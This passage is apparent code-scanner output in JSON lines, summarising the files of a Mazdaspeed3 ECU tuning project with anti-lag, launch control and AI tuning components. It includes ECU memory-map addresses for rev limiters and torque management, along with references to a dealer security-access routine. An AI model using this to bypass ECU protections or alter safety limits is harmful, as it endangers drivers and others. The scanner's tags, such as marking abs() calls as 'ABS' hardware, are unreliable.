"group_tags": ["ads"]}
{"file_path": "add10.py", "lines_read": 645, "features_found": [{"type": "function", "name": "test_advanced_turbo_spool", "line": 593}, {"type": "function", "name": "test_advanced_ai_mapping", "line": 618}, {"type": "function", "name": "__init__", "line": 15}, {"type": "function", "name": "_create_compressor_map", "line": 53}, {"type": "function", "name": "calculate_turbo_spool_time", "line": 80}, {"type": "function", "name": "_turbo_dynamics", "line": 130}, {"type": "function", "name": "_calculate_exhaust_energy", "line": 165}, {"type": "function", "name": "_calculate_engine_airflow", "line": 199}, {"type": "function", "name": "_calculate_turbine_power", "line": 217}, {"type": "function", "name": "_calculate_compressor_power", "line": 254}, {"type": "function", "name": "_get_compressor_efficiency", "line": 284}, {"type": "function", "name": "_calculate_friction_losses", "line": 296}, {"type": "function", "name": "__init__", "line": 312}, {"type": "function", "name": "_create_advanced_action_mapping", "line": 324}, {"type": "function", "name": "_create_actor_network", "line": 361}, {"type": "function", "name": "_create_critic_network", "line": 389}, {"type": "function", "name": "map_action_to_adjustments", "line": 422}, {"type": "function", "name": "_select_action_index", "line": 439}, {"type": "function", "name": "_scale_adjustments_by_state", "line": 462}, {"type": "function", "name": "_apply_non_linear_corrections", "line": 499}, {"type": "function", "name": "__init__", "line": 545}, {"type": "function", "name": "add", "line": 554}, {"type": "function", "name": "sample", "line": 569}, {"type": "function", "name": "update_priorities", "line": 587}, {"type": "function", "name": "time_to_target", "line": 113}, {"type": "function", "name": "__init__", "line": 366}, {"type": "function", "name": "forward", "line": 384}, {"type": "function", "name": "__init__", "line": 394}, {"type": "function", "name": "forward", "line": 414}, {"type": "import", "module": "scipy.integrate", "line": null}, {"type": "import", "module": "scipy.optimize", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "solve_ivp", "line": null}, {"type": "import", "module": "minimize", "line": null}, {"type": "import", "module": "math", "line": null}, {"type": "import", "module": "torch.nn", "line": null}, {"type": "import", "module": "torch.nn", "line": null}], "components_found": [{"type": "class", "name": "AdvancedTurboPhysics", "line": 12}, {"type": "class", "name": "AdvancedAITuning", "line": 309}, {"type": "class", "name": "PrioritizedReplayBuffer", "line": 542}, {"type": "class", "name": "ActorNetwork", "line": 365}, {"type": "class", "name": "CriticNetwork", "line": 393}], "algorithms": [{"type": "algorithm_function", "line": 80, "content": "def calculate_turbo_spool_time(self, engine_rpm, throttle_position, current_turbo_rpm=0,"}, {"type": "algorithm_function", "line": 165, "content": "def _calculate_exhaust_energy(self, engine_rpm, throttle_position, exhaust_temp, exhaust_pressure):"}, {"type": "algorithm_function", "line": 199, "content": "def _calculate_engine_airflow(self, rpm, throttle_position):"}, {"type": "algorithm_function", "line": 217, "content": "def _calculate_turbine_power(self, turbo_omega, exhaust_energy):"}, {"type": "algorithm_function", "line": 254, "content": "def _calculate_compressor_power(self, turbo_omega, target_turbo_rpm):"}, {"type": "algorithm_function", "line": 296, "content": "def _calculate_friction_losses(self, turbo_omega):"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 68, "hardware": "ABS", "content": "flow_dist = abs(flow - peak_flow) / peak_flow"}, {"type": "hardware", "line": 69, "hardware": "ABS", "content": "pr_dist = abs(pr - peak_pr) / peak_pr"}, {"type": "hardware", "line": 114, "hardware": "ABS", "content": "return abs(rpm_function(t)[0] - target_turbo_rpm)"}, {"type": "hardware", "line": 158, "hardware": "ABS", "content": "alpha = net_torque / I if abs(net_torque) > 1e-6 else 0"}, {"type": "hardware", "line": 243, "hardware": "ABS", "content": "ratio_deviation = abs(velocity_ratio - optimal_ratio) / optimal_ratio"}, {"type": "hardware", "line": 289, "hardware": "ABS", "content": "pr_idx = np.argmin(np.abs(map_data['pressure_ratio'] - pressure_ratio))"}, {"type": "hardware", "line": 290, "hardware": "ABS", "content": "flow_idx = np.argmin(np.abs(map_data['flow'] - mass_flow))"}, {"type": "hardware", "line": 512, "hardware": "ABS", "content": "rpm_deviation = abs(rpm - optimal_rpm) / optimal_rpm"}], "security_logic": [{"type": "security_pattern", "line": 491, "pattern": "key", "content": "for key in ['ignition_timing', 'boost_target', 'target_afr', 'wgdc_reduction',"}, {"type": "security_pattern", "line": 494, "pattern": "key", "content": "if key in scaled:"}, {"type": "security_pattern", "line": 495, "pattern": "key", "content": "scaled[key] *= overall_factor"}, {"type": "security_pattern", "line": 525, "pattern": "key", "content": "for key in ['wgdc_reduction', 'wgdc_increase', 'boost_target']:"}, {"type": "security_pattern", "line": 526, "pattern": "key", "content": "if key in corrected:"}, {"type": "security_pattern", "line": 527, "pattern": "key", "content": "corrected[key] *= lag_compensation"}, {"type": "security_pattern", "line": 535, "pattern": "key", "content": "for key in ['vvt_intake_advance', 'vvt_intake_retard',"}, {"type": "security_pattern", "line": 537, "pattern": "key", "content": "if key in corrected:"}, {"type": "security_pattern", "line": 538, "pattern": "key", "content": "corrected[key] *= vvt_effectiveness"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add11.py", "lines_read": 395, "features_found": [{"type": "function", "name": "__init__", "line": 15}, {"type": "function", "name": "calculate_ideal_gas_velocity", "line": 28}, {"type": "function", "name": "calculate_mass_flow_rate", "line": 61}, {"type": "function", "name": "__init__", "line": 99}, {"type": "function", "name": "_initialize_turbo_specs", "line": 103}, {"type": "function", "name": "_create_detailed_compressor_map", "line": 122}, {"type": "function", "name": "calculate_turbine_power", "line": 159}, {"type": "function", "name": "calculate_compressor_power", "line": 213}, {"type": "function", "name": "_get_compressor_efficiency", "line": 243}, {"type": "function", "name": "__init__", "line": 267}, {"type": "function", "name": "_initialize_engine_specs", "line": 271}, {"type": "function", "name": "_create_detailed_ve_table", "line": 285}, {"type": "function", "name": "calculate_indicated_mean_effective_pressure", "line": 302}, {"type": "function", "name": "_get_volumetric_efficiency", "line": 352}, {"type": "function", "name": "_calculate_timing_efficiency", "line": 385}, {"type": "import", "module": "scipy.integrate", "line": null}, {"type": "import", "module": "scipy.optimize", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "solve_ivp", "line": null}, {"type": "import", "module": "minimize_scalar", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "IdealGasPhysics", "line": 12}, {"type": "class", "name": "TurbochargerDynamics", "line": 96}, {"type": "class", "name": "EngineCycleAnalysis", "line": 264}], "algorithms": [{"type": "algorithm_function", "line": 28, "content": "def calculate_ideal_gas_velocity(self, temperature, pressure_ratio, gas_type='air'):"}, {"type": "algorithm_function", "line": 61, "content": "def calculate_mass_flow_rate(self, area, upstream_pressure, upstream_temp,"}, {"type": "algorithm_function", "line": 159, "content": "def calculate_turbine_power(self, turbo_rpm, exhaust_mass_flow, exhaust_temp,"}, {"type": "algorithm_function", "line": 213, "content": "def calculate_compressor_power(self, turbo_rpm, mass_flow, inlet_temp,"}, {"type": "algorithm_function", "line": 302, "content": "def calculate_indicated_mean_effective_pressure(self, rpm, load, afr, ignition_timing,"}, {"type": "algorithm_function", "line": 385, "content": "def _calculate_timing_efficiency(self, ignition_timing, rpm):"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 25, "hardware": "ECU", "content": "self.M_air = 28.97  # g/mol - Air molecular weight"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "self.M_exhaust = 29.5  # g/mol - Approximate exhaust molecular weight"}, {"type": "hardware", "line": 139, "hardware": "ABS", "content": "pr_dev = abs(pr - peak_eff_pr) / peak_eff_pr"}, {"type": "hardware", "line": 140, "hardware": "ABS", "content": "speed_dev = abs(speed - peak_eff_speed) / peak_eff_speed"}, {"type": "hardware", "line": 195, "hardware": "ABS", "content": "ratio_deviation = abs(velocity_ratio - optimal_ratio) / optimal_ratio"}, {"type": "hardware", "line": 248, "hardware": "ABS", "content": "pr_idx = np.argmin(np.abs(map_data['pressure_ratio'] - pressure_ratio))"}, {"type": "hardware", "line": 249, "hardware": "ABS", "content": "speed_idx = np.argmin(np.abs(map_data['corrected_speed'] - corrected_speed))"}, {"type": "hardware", "line": 317, "hardware": "ABS", "content": "P_intake = boost_pressure * 6.89476 + 101.325  # Convert PSI to kPa absolute"}, {"type": "hardware", "line": 390, "hardware": "ABS", "content": "timing_error = abs(ignition_timing - mbt_timing)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add12.py", "lines_read": 365, "features_found": [{"type": "function", "name": "__init__", "line": 14}, {"type": "function", "name": "_initialize_constants", "line": 17}, {"type": "function", "name": "calculate_brake_horsepower", "line": 29}, {"type": "function", "name": "calculate_engine_torque", "line": 45}, {"type": "function", "name": "calculate_air_fuel_ratio", "line": 63}, {"type": "function", "name": "calculate_boost_pressure", "line": 70}, {"type": "function", "name": "calculate_pressure_ratio", "line": 83}, {"type": "function", "name": "calculate_compressor_outlet_temperature", "line": 95}, {"type": "function", "name": "calculate_turbo_mass_flow", "line": 117}, {"type": "function", "name": "calculate_exhaust_gas_temperature", "line": 140}, {"type": "function", "name": "calculate_volumetric_efficiency", "line": 171}, {"type": "function", "name": "__init__", "line": 209}, {"type": "function", "name": "_initialize_secret_methods", "line": 212}, {"type": "function", "name": "_faster_spool_technique", "line": 237}, {"type": "function", "name": "_vvt_torque_optimization", "line": 266}, {"type": "function", "name": "_ignition_knock_margin", "line": 299}, {"type": "function", "name": "_boost_taper_optimization", "line": 335}, {"type": "function", "name": "apply_tuning_secret", "line": 359}, {"type": "import", "module": "scipy", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "interpolate", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "AdvancedCalculations", "line": 11}, {"type": "class", "name": "TuningSecrets", "line": 206}], "algorithms": [{"type": "algorithm_function", "line": 29, "content": "def calculate_brake_horsepower(self, engine_torque_nm, rpm):"}, {"type": "algorithm_function", "line": 45, "content": "def calculate_engine_torque(self, imep, displacement_liters, volumetric_efficiency=0.85):"}, {"type": "algorithm_function", "line": 63, "content": "def calculate_air_fuel_ratio(self, mass_air, mass_fuel):"}, {"type": "algorithm_function", "line": 70, "content": "def calculate_boost_pressure(self, pressure_ratio, atmospheric_pressure=None):"}, {"type": "algorithm_function", "line": 83, "content": "def calculate_pressure_ratio(self, boost_psi, atmospheric_pressure=None):"}, {"type": "algorithm_function", "line": 95, "content": "def calculate_compressor_outlet_temperature(self, inlet_temp, pressure_ratio, efficiency):"}, {"type": "algorithm_function", "line": 117, "content": "def calculate_turbo_mass_flow(self, engine_rpm, engine_displacement, volumetric_efficiency,"}, {"type": "algorithm_function", "line": 140, "content": "def calculate_exhaust_gas_temperature(self, intake_temp, pressure_ratio, afr,"}, {"type": "algorithm_function", "line": 171, "content": "def calculate_volumetric_efficiency(self, engine_rpm, intake_runner_length,"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 75, "hardware": "ABS", "content": "absolute_pressure = pressure_ratio * atmospheric_pressure"}, {"type": "hardware", "line": 76, "hardware": "ABS", "content": "boost_pressure = absolute_pressure - atmospheric_pressure"}, {"type": "hardware", "line": 89, "hardware": "ABS", "content": "absolute_pressure = atmospheric_pressure + boost_pressure"}, {"type": "hardware", "line": 91, "hardware": "ABS", "content": "pressure_ratio = absolute_pressure / atmospheric_pressure"}, {"type": "hardware", "line": 160, "hardware": "ABS", "content": "timing_error = abs(ignition_timing - optimal_timing)"}], "security_logic": [{"type": "security_pattern", "line": 291, "pattern": "key", "content": "for key in adjustments:"}, {"type": "security_pattern", "line": 292, "pattern": "key", "content": "if 'advance' in key:"}, {"type": "security_pattern", "line": 293, "pattern": "key", "content": "adjustments[key] *= 1.2"}, {"type": "security_pattern", "line": 294, "pattern": "key", "content": "elif 'retard' in key:"}, {"type": "security_pattern", "line": 295, "pattern": "key", "content": "adjustments[key] *= 1.1"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add13.py", "lines_read": 153, "features_found": [{"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "'ignition_timing_base': 0xFFA000,"}, {"type": "protocol", "line": 96, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_map_primary': 0xFFA800,"}, {"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_target_map': 0xFFB000,"}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_intake_map': 0xFFB400,"}, {"type": "protocol", "line": 99, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_exhaust_map': 0xFFB500,"}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limiter_soft': 0xFFB800,"}, {"type": "protocol", "line": 101, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limiter_hard': 0xFFB810,"}, {"type": "protocol", "line": 102, "protocol": "0x[0-9A-Fa-f]+", "content": "'torque_management': 0xFFBC00,"}, {"type": "protocol", "line": 103, "protocol": "0x[0-9A-Fa-f]+", "content": "'knock_learn_table': 0xFFC000,"}, {"type": "protocol", "line": 104, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_trim_adaptive': 0xFFC200"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "'ecu_address': 0x7E0,"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_address': 0x7E1,"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 7, "hardware": "vehicle", "content": "All vehicle-specific parameters and tuning limits"}, {"type": "hardware", "line": 82, "hardware": "vehicle", "content": "VEHICLE_SPECS = {"}, {"type": "hardware", "line": 94, "hardware": "ECU", "content": "ECU_MEMORY_MAP = {"}, {"type": "hardware", "line": 111, "hardware": "ECU", "content": "'ecu_address': 0x7E0,"}, {"type": "hardware", "line": 112, "hardware": "TCM", "content": "'tcm_address': 0x7E1,"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add14.py", "lines_read": 798, "features_found": [{"type": "function", "name": "__init__", "line": 19}, {"type": "function", "name": "calculate_als_parameters", "line": 63}, {"type": "function", "name": "calculate_exhaust_energy_boost", "line": 130}, {"type": "function", "name": "update_turbo_spool_als", "line": 157}, {"type": "function", "name": "safety_monitor", "line": 191}, {"type": "function", "name": "__init__", "line": 246}, {"type": "function", "name": "calculate_rev_limit_parameters", "line": 278}, {"type": "function", "name": "_ignition_cut_strategy", "line": 331}, {"type": "function", "name": "_fuel_cut_strategy", "line": 361}, {"type": "function", "name": "_combined_cut_strategy", "line": 391}, {"type": "function", "name": "calculate_exhaust_pop_effect", "line": 422}, {"type": "function", "name": "__init__", "line": 455}, {"type": "function", "name": "calculate_launch_parameters", "line": 495}, {"type": "function", "name": "_calculate_traction_control", "line": 564}, {"type": "function", "name": "calculate_optimal_shift_points", "line": 607}, {"type": "function", "name": "calculate_launch_timing_advance", "line": 642}, {"type": "function", "name": "__init__", "line": 676}, {"type": "function", "name": "set_performance_mode", "line": 713}, {"type": "function", "name": "calculate_integrated_performance_parameters", "line": 730}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "scipy", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "signal", "line": null}], "components_found": [{"type": "class", "name": "AntiLagSystem", "line": 13}, {"type": "class", "name": "TwoStepRevLimiter", "line": 240}, {"type": "class", "name": "LaunchControlSystem", "line": 448}, {"type": "class", "name": "AdvancedPerformanceManager", "line": 670}], "algorithms": [{"type": "algorithm_function", "line": 63, "content": "def calculate_als_parameters(self, vehicle_speed: float, throttle_position: float,"}, {"type": "algorithm_function", "line": 130, "content": "def calculate_exhaust_energy_boost(self, current_exhaust_energy: float,"}, {"type": "algorithm_function", "line": 278, "content": "def calculate_rev_limit_parameters(self, engine_rpm: float, vehicle_speed: float,"}, {"type": "algorithm_function", "line": 422, "content": "def calculate_exhaust_pop_effect(self, cut_parameters: Dict, exhaust_temp: float) -> float:"}, {"type": "algorithm_function", "line": 495, "content": "def calculate_launch_parameters(self, vehicle_speed: float, engine_rpm: float,"}, {"type": "algorithm_function", "line": 564, "content": "def _calculate_traction_control(self, wheel_speeds: List[float],"}, {"type": "algorithm_function", "line": 607, "content": "def calculate_optimal_shift_points(self, current_gear: int, engine_rpm: float,"}, {"type": "algorithm_function", "line": 642, "content": "def calculate_launch_timing_advance(self, current_rpm: float, current_boost: float,"}, {"type": "algorithm_function", "line": 730, "content": "def calculate_integrated_performance_parameters(self, sensor_data: Dict) -> Dict:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 63, "hardware": "vehicle", "content": "def calculate_als_parameters(self, vehicle_speed: float, throttle_position: float,"}, {"type": "hardware", "line": 77, "hardware": "vehicle", "content": "vehicle_speed >= mode_params['activation_speed'] and"}, {"type": "hardware", "line": 97, "hardware": "vehicle", "content": "vehicle_speed < mode_params['activation_speed'] - 10  # Too slow"}, {"type": "hardware", "line": 192, "hardware": "vehicle", "content": "engine_rpm: float, vehicle_speed: float) -> Dict:"}, {"type": "hardware", "line": 250, "hardware": "ABS", "content": "self.hard_redline = 7200  # Absolute fuel cut"}, {"type": "hardware", "line": 278, "hardware": "vehicle", "content": "def calculate_rev_limit_parameters(self, engine_rpm: float, vehicle_speed: float,"}, {"type": "hardware", "line": 296, "hardware": "vehicle", "content": "vehicle_speed < 5.0 and  # Stationary or very slow"}, {"type": "hardware", "line": 311, "hardware": "vehicle", "content": "elif self.launch_active and vehicle_speed > 10.0:"}, {"type": "hardware", "line": 437, "hardware": "ABS", "content": "ignition_retard = abs(cut_parameters.get('ignition_retard', 0.0))"}, {"type": "hardware", "line": 495, "hardware": "vehicle", "content": "def calculate_launch_parameters(self, vehicle_speed: float, engine_rpm: float,"}, {"type": "hardware", "line": 514, "hardware": "vehicle", "content": "vehicle_speed < 2.0 and  # Essentially stationary"}, {"type": "hardware", "line": 555, "hardware": "vehicle", "content": "if vehicle_speed > 20.0:  # Launch complete"}, {"type": "hardware", "line": 608, "hardware": "vehicle", "content": "vehicle_speed: float, throttle_position: float) -> Dict:"}, {"type": "hardware", "line": 735, "hardware": "vehicle", "content": "vehicle_speed = sensor_data.get('vehicle_speed', 0.0)"}, {"type": "hardware", "line": 749, "hardware": "vehicle", "content": "vehicle_speed, throttle_position, turbo_rpm, exhaust_temp"}, {"type": "hardware", "line": 753, "hardware": "vehicle", "content": "engine_rpm, vehicle_speed, clutch_position, throttle_position"}, {"type": "hardware", "line": 757, "hardware": "vehicle", "content": "vehicle_speed, engine_rpm, throttle_position, clutch_position,"}, {"type": "hardware", "line": 762, "hardware": "vehicle", "content": "current_gear, engine_rpm, vehicle_speed, throttle_position"}, {"type": "hardware", "line": 767, "hardware": "vehicle", "content": "exhaust_temp, coolant_temp, engine_rpm, vehicle_speed"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add15.py", "lines_read": 467, "features_found": [{"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "_create_k04_compressor_map", "line": 56}, {"type": "function", "name": "_create_compressor_interpolator", "line": 94}, {"type": "function", "name": "_create_k04_turbine_map", "line": 121}, {"type": "function", "name": "calculate_compressor_operation", "line": 161}, {"type": "function", "name": "_calculate_surge_line", "line": 201}, {"type": "function", "name": "_calculate_choke_line", "line": 209}, {"type": "function", "name": "calculate_turbine_efficiency", "line": 217}, {"type": "function", "name": "calculate_turbo_spool_dynamics", "line": 235}, {"type": "function", "name": "calculate_compressor_power_requirement", "line": 276}, {"type": "function", "name": "calculate_turbine_power_output", "line": 301}, {"type": "function", "name": "__init__", "line": 332}, {"type": "function", "name": "calculate_wastegate_control", "line": 348}, {"type": "function", "name": "update_turbo_system", "line": 383}, {"type": "function", "name": "_calculate_compressor_outlet_temp", "line": 452}, {"type": "import", "module": "scipy.integrate", "line": null}, {"type": "import", "module": "scipy.interpolate", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "solve_ivp", "line": null}, {"type": "import", "module": "RegularGridInterpolator", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "K04Turbocharger", "line": 12}, {"type": "class", "name": "TurboSystemManager", "line": 326}], "algorithms": [{"type": "algorithm_function", "line": 161, "content": "def calculate_compressor_operation(self, corrected_speed: float, pressure_ratio: float):"}, {"type": "algorithm_function", "line": 201, "content": "def _calculate_surge_line(self, corrected_speed: float) -> float:"}, {"type": "algorithm_function", "line": 209, "content": "def _calculate_choke_line(self, corrected_speed: float) -> float:"}, {"type": "algorithm_function", "line": 217, "content": "def calculate_turbine_efficiency(self, velocity_ratio: float, expansion_ratio: float) -> float:"}, {"type": "algorithm_function", "line": 235, "content": "def calculate_turbo_spool_dynamics(self, current_rpm: float, turbine_power: float,"}, {"type": "algorithm_function", "line": 276, "content": "def calculate_compressor_power_requirement(self, mass_flow: float, pressure_ratio: float,"}, {"type": "algorithm_function", "line": 301, "content": "def calculate_turbine_power_output(self, mass_flow: float, inlet_temp: float,"}, {"type": "algorithm_function", "line": 348, "content": "def calculate_wastegate_control(self, current_boost: float, target_boost: float,"}, {"type": "algorithm_function", "line": 452, "content": "def _calculate_compressor_outlet_temp(self, inlet_temp: float, pressure_ratio: float,"}], "protocols": [{"type": "protocol", "line": 352, "protocol": "PID", "content": "Uses PID-like control with RPM and throttle compensation"}], "hardware_assumptions": [{"type": "hardware", "line": 179, "hardware": "ABS", "content": "speed_idx = np.argmin(np.abs(self.compressor_map['corrected_speeds'] - corrected_speed))"}, {"type": "hardware", "line": 180, "hardware": "ABS", "content": "pr_idx = np.argmin(np.abs(self.compressor_map['pressure_ratios'] - pressure_ratio))"}, {"type": "hardware", "line": 228, "hardware": "ABS", "content": "vr_idx = np.argmin(np.abs(self.turbine_map['velocity_ratios'] - velocity_ratio))"}, {"type": "hardware", "line": 229, "hardware": "ABS", "content": "er_idx = np.argmin(np.abs(self.turbine_map['expansion_ratios'] - expansion_ratio))"}, {"type": "hardware", "line": 360, "hardware": "ABS", "content": "if abs(boost_error) < 5.0:  # Only integrate when close to target"}, {"type": "hardware", "line": 396, "hardware": "ABS", "content": "current_absolute_pressure = self.current_boost * 6.89476 + atmospheric_pressure"}, {"type": "hardware", "line": 397, "hardware": "ABS", "content": "pressure_ratio = current_absolute_pressure / atmospheric_pressure"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add16.py", "lines_read": 547, "features_found": [{"type": "function", "name": "main", "line": 500}, {"type": "function", "name": "__init__", "line": 38}, {"type": "function", "name": "_initialize_system", "line": 71}, {"type": "function", "name": "start_real_time_tuning", "line": 107}, {"type": "function", "name": "stop_real_time_tuning", "line": 128}, {"type": "function", "name": "_data_acquisition_loop", "line": 140}, {"type": "function", "name": "_read_sensor_data", "line": 166}, {"type": "function", "name": "_log_sensor_data", "line": 199}, {"type": "function", "name": "_process_sensor_data", "line": 204}, {"type": "function", "name": "_tuning_optimization_loop", "line": 241}, {"type": "function", "name": "_apply_tuning_secrets", "line": 297}, {"type": "function", "name": "_combine_tuning_adjustments", "line": 333}, {"type": "function", "name": "_apply_safety_limits", "line": 369}, {"type": "function", "name": "_apply_tuning_parameters", "line": 413}, {"type": "function", "name": "_update_system_status", "line": 436}, {"type": "function", "name": "get_system_status", "line": 453}, {"type": "function", "name": "set_performance_mode", "line": 462}, {"type": "function", "name": "execute_dealer_command", "line": 471}, {"type": "function", "name": "clear_adaptations", "line": 481}, {"type": "function", "name": "save_ai_models", "line": 491}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "app.database.ecu_database", "line": null}, {"type": "import", "module": "app.services.ai_tuner", "line": null}, {"type": "import", "module": "app.services.physics_engine", "line": null}, {"type": "import", "module": "app.services.dealer_service", "line": null}, {"type": "import", "module": "app.services.performance_features", "line": null}, {"type": "import", "module": "app.models.turbo_models", "line": null}, {"type": "import", "module": "app.utils.calculations", "line": null}, {"type": "import", "module": "config.mazdaspeed3_config", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Mazdaspeed3Database", "line": null}, {"type": "import", "module": "AITuningSystem", "line": null}, {"type": "import", "module": "TurbochargerPhysics,", "line": null}, {"type": "import", "module": "MazdaDealerSecurity", "line": null}, {"type": "import", "module": "AdvancedPerformanceManager", "line": null}, {"type": "import", "module": "TurboSystemManager", "line": null}, {"type": "import", "module": "AdvancedCalculations,", "line": null}, {"type": "import", "module": "*", "line": null}], "components_found": [{"type": "class", "name": "Mazdaspeed3Tuner", "line": 32}], "algorithms": [], "protocols": [{"type": "protocol", "line": 169, "protocol": "CAN", "content": "In real implementation, this would interface with CAN bus and OBD-II"}, {"type": "protocol", "line": 169, "protocol": "OBD", "content": "In real implementation, this would interface with CAN bus and OBD-II"}], "hardware_assumptions": [{"type": "hardware", "line": 11, "hardware": "ECU", "content": "from app.database.ecu_database import Mazdaspeed3Database"}, {"type": "hardware", "line": 14, "hardware": "ECU", "content": "from app.services.dealer_service import MazdaDealerSecurity"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "self.dealer_security = MazdaDealerSecurity()"}, {"type": "hardware", "line": 86, "hardware": "ECU", "content": "security_status = self.dealer_security.perform_security_access('ecu')"}, {"type": "hardware", "line": 87, "hardware": "ECU", "content": "logger.info(f\"Dealer security access: {security_status}\")"}, {"type": "hardware", "line": 96, "hardware": "ECU", "content": "'security_access': True,"}, {"type": "hardware", "line": 168, "hardware": "vehicle", "content": "Read current sensor data from vehicle systems"}, {"type": "hardware", "line": 169, "hardware": "CAN bus", "content": "In real implementation, this would interface with CAN bus and OBD-II"}, {"type": "hardware", "line": 175, "hardware": "vehicle", "content": "'vehicle_speed': 45.2,"}, {"type": "hardware", "line": 414, "hardware": "vehicle", "content": "\"\"\"Apply tuning parameters to vehicle systems\"\"\""}, {"type": "hardware", "line": 471, "hardware": "ECU", "content": "def execute_dealer_command(self, command: str, parameters: dict = None) -> dict:"}, {"type": "hardware", "line": 472, "hardware": "ECU", "content": "\"\"\"Execute dealer-level diagnostic command\"\"\""}, {"type": "hardware", "line": 474, "hardware": "ECU", "content": "result = self.dealer_security.execute_dealer_command(command, parameters)"}, {"type": "hardware", "line": 475, "hardware": "ECU", "content": "logger.info(f\"Dealer command executed: {command}\")"}, {"type": "hardware", "line": 482, "hardware": "ECU", "content": "\"\"\"Clear all ECU adaptations\"\"\""}, {"type": "hardware", "line": 484, "hardware": "ECU", "content": "results = self.dealer_security.clear_all_adaptations()"}, {"type": "hardware", "line": 485, "hardware": "ECU", "content": "logger.info(\"ECU adaptations cleared\")"}, {"type": "hardware", "line": 513, "hardware": "ECU", "content": "print(f\"Security Access: {status['system']['security_access']}\")"}], "security_logic": [{"type": "security_pattern", "line": 86, "pattern": "security_access", "content": "security_status = self.dealer_security.perform_security_access('ecu')"}, {"type": "security_pattern", "line": 96, "pattern": "security_access", "content": "'security_access': True,"}, {"type": "security_pattern", "line": 349, "pattern": "key", "content": "for key, value in ai_adjustments.items():"}, {"type": "security_pattern", "line": 350, "pattern": "key", "content": "if key in combined:"}, {"type": "security_pattern", "line": 352, "pattern": "key", "content": "combined[key] = 0.6 * combined[key] + 0.4 * value"}, {"type": "security_pattern", "line": 354, "pattern": "key", "content": "combined[key] = value * 0.6  # Reduced weight for AI-only adjustments"}, {"type": "security_pattern", "line": 357, "pattern": "key", "content": "for key, value in secret_adjustments.items():"}, {"type": "security_pattern", "line": 358, "pattern": "key", "content": "if key in combined:"}, {"type": "security_pattern", "line": 360, "pattern": "key", "content": "if 'spool' in key or 'boost' in key:"}, {"type": "security_pattern", "line": 361, "pattern": "key", "content": "combined[key] = 0.3 * combined[key] + 0.7 * value"}, {"type": "security_pattern", "line": 363, "pattern": "key", "content": "combined[key] = 0.5 * combined[key] + 0.5 * value"}, {"type": "security_pattern", "line": 365, "pattern": "key", "content": "combined[key] = value"}, {"type": "security_pattern", "line": 513, "pattern": "security_access", "content": "print(f\"Security Access: {status['system']['security_access']}\")"}, {"type": "security_pattern", "line": 533, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add17.py", "lines_read": 44, "features_found": [{"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": ".database.ecu_database", "line": null}, {"type": "import", "module": ".services.ai_tuner", "line": null}, {"type": "import", "module": ".services.physics_engine", "line": null}, {"type": "import", "module": ".services.dealer_service", "line": null}, {"type": "import", "module": ".services.performance_features", "line": null}, {"type": "import", "module": ".models.engine_models", "line": null}, {"type": "import", "module": ".models.turbo_models", "line": null}, {"type": "import", "module": ".utils.calculations", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "Mazdaspeed3Database,", "line": null}, {"type": "import", "module": "AITuningSystem", "line": null}, {"type": "import", "module": "TurbochargerPhysics,", 